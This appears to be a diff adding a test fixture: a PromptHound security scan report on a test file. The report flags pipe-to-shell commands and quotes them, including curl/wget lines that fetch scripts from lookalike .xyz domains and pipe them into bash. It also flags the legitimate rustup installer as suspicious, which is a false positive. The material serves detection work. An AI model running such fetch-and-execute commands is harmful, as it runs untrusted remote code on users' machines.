@@ -1,0 +1,30 @@
+======================================================================
+PromptHound Scan: <TEST_FILE_PATH>
+======================================================================
+
+── RULE HITS (deterministic heuristics) ───────────────────────────────
+  [HIGH] SHELL_PIPE_001  span=(25, 25)
+    Shell pipe-to-interpreter detected at line 25: network fetcher piped directly into a shell interpreter ('curl -fsSL https://raw.githubusercontent.xyz/devtools-collective/setup/main/install.sh | bash')
+  [HIGH] SHELL_PIPE_001  span=(37, 37)
+    Shell pipe-to-interpreter detected at line 37: network fetcher piped directly into a shell interpreter ('wget -qO- https://nodeinstall.xyz/setup_lts | bash')
+  [HIGH] SHELL_PIPE_001  span=(45, 45)
+    Shell pipe-to-interpreter detected at line 45: network fetcher piped directly into a shell interpreter ("curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh")
+  [WARN] SUSPICIOUS_DOMAIN_001  span=(25, 25)
+    Non-standard TLD at line 25: 'raw.githubusercontent.xyz' (TLD: .'xyz'). Uncommon TLDs are associated with newly-registered attacker domains.
+  [WARN] SUSPICIOUS_DOMAIN_001  span=(37, 37)
+    Non-standard TLD at line 37: 'nodeinstall.xyz' (TLD: .'xyz'). Uncommon TLDs are associated with newly-registered attacker domains.
+  [WARN] SUSPICIOUS_DOMAIN_001  span=(45, 45)
+    Non-standard TLD at line 45: 'sh.rustup.rs' (TLD: .'rs'). Uncommon TLDs are associated with newly-registered attacker domains.
+
+── CLASSIFIER (ML risk score) ─────────────────────────────────────────
+  Score : 1.0000  [MALICIOUS]
+  Decision path:
+    padding_ratio <= 0.017415  (malicious_frac=0.5238)
+    [leaf]  malicious_frac=1.0000
+
+── CAPABILITY CHAINS (structural sequence detection) ──────────────────
+  CHAIN: download→execute
+    step: download  (line 25)
+    step: execute  (line 51)
+
+======================================================================
